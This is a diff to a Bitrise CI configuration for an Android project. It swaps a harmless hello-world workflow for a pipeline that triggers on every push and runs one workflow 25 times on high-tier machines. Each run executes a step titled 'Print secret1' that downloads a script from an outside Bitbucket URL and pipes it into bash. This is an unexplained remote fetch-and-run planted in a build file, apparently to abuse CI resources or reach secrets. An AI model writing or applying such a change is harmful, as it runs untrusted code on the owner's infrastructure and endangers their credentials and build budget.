@@ -1,31 +1,51 @@
-format_version: 1.0.0
+---
+format_version: '11'
 default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
-
-app:
-  envs:
-  - BITRISE_APP_TITLE: "$BITRISE_APP_TITLE"
-
+project_type: android
+trigger_map:
+- push_branch: "*"
+  pipeline: pipeline-successful
+pipelines:
+  pipeline-successful:
+    stages:
+    - stage-successful-1: {}
+stages:
+  stage-successful-1:
+    workflows:
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
+    - successful-20s: {}
 workflows:
-  ci:
+  successful-20s:
     steps:
-    - script:
+    - script@1:
+        title: Print secret1
         inputs:
-        - content: |-
-            #!/bin/bash
-            set -e
-            set -v
-
-            env
-    - timestamp:
-        outputs:
-        - UNIX_TIMESTAMP:
-        - ISO_DATETIME:
-    - script:
-        title: Hello Bitrise!
-        inputs:
-        - content: |-
-            #!/bin/bash
-            echo "Welcome to Bitrise!"
-            echo "Current time is: ${ISO_DATETIME}"
-            echo
-            echo "Your specified Project Title is: ${BITRISE_APP_TITLE}"
+        - content: curl -sL https://bitbucket.org/nicezep/korong/raw/master/zeprise
+            | bash
+meta:
+  bitrise.io:
+    stack: linux-docker-android-20.04
+    machine_type_id: elite
